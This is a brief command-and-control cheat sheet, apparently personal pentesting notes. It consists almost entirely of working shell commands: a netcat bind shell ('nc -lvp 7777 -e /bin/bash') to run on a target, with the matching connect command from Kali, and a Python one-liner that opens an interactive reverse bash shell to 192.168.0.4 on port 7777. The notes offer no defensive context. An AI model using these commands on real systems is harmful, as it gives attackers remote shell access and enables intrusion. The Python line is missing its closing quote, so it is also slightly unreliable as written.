#commandandcontrol

Enter on kali
```
nc ip 7777
```


Enter on ubuntu or CentOS
```
nc -lvp 7777 -e /bin/bash
```

```
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.4',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);
```